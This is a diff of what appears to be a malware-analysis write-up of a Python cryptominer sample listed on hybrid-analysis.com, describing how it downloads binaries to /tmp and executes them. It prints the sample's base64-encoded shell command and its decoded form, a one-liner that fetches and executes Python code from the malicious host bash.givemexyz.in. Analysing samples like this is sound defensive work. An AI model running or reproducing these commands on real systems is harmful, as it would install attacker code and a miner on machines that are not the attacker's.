@@ -1,3 +1,7 @@
+### Scrolling through hybrid-analysis.com
+
+This sample can be found using the following <a href="https://www.hybrid-analysis.com/sample/bf62bbe85d6a243c0567c54e6889c480cfab04760125b312a547d7993c3551c6">here</a>
+This sample caught my eye because Hybrid Analysis labled the sample as 'Python:Miner'. 
 ```python
 import urllib
 import platform
@@ -63,3 +67,12 @@ else:
 		pass
 
 ```
+The first thing that the code does is check to see if the infected operating system is 64 bit. The code will then visit the URL http://bash.givemexyz[.]in/x86_64. If the site returns a 200 status the code will save the contents of web page to a file named '/tmp/x86_64'. Next the code will visit 'http://bash.givemexyz.in/i686'. Again if the page returns a 200 status code the code will save the contents of the file as '/tmp/i686'. The code will do the same thing with the third URL, 'http://bash.givemexyz.in/go'. The code will save the file in a file named '/tmp/go'. 
+
+Next the code will use Python's chmod method to change the permissons to 0777. After that is done the code will use Python's system command to run commands on the infected machine. The command looked like this: `echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -` 
+
+The command above will use the system's echo command to echo the base64 string, the '|' tells the operating system to also run the command 'base64 -d' on the base64 string. The 'base64 -d' command is used to decode base64 strings. The decoded command looks like this:
+
+`python -c 'import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())'`
+
+
